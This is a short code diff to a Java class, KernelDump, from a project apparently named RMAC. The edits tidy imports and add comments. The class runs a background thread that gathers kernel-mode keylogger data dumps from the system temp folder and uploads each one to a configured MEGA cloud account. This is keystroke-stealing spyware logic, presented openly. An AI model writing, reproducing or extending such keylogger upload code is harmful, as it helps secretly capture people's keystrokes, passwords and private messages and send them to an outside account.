@@ -3,14 +3,15 @@ package com.rmac.process;
 import com.rmac.RMAC;
 import com.rmac.utils.ArchiveFileType;
 import com.rmac.utils.Constants;
-import java.io.File;
 import java.io.IOException;
 import java.nio.file.Path;
 import java.util.ArrayList;
 import java.util.List;
-import java.util.stream.Stream;
 import lombok.extern.slf4j.Slf4j;
 
+/**
+ * Non-blocking process to upload all RMAC Kernel-mode key logger data dumps.
+ */
 @Slf4j
 public class KernelDump {
 
@@ -24,12 +25,22 @@ public class KernelDump {
     this.thread.start();
   }
 
+  /**
+   * Upload all RMAC KMKL data dumps to the configured MEGA account.
+   */
   public void run() {
     List<Path> dumps = this.getAllLogFiles(Constants.SYS_TEMP_LOCATION);
     dumps.forEach(
-        dump -> RMAC.uploader.uploadFile(dump.toAbsolutePath().toString(), ArchiveFileType.KEY));
+        dump -> RMAC.uploader.uploadFile(dump.toAbsolutePath().toString(), ArchiveFileType.KEY)
+    );
   }
 
+  /**
+   * Gets reference to all the data dumps except the newest.
+   *
+   * @param dirPath The directory in which data dumps are stored.
+   * @return The list of data dumps.
+   */
   public List<Path> getAllLogFiles(String dirPath) {
     List<Path> dumps = new ArrayList<>();
 
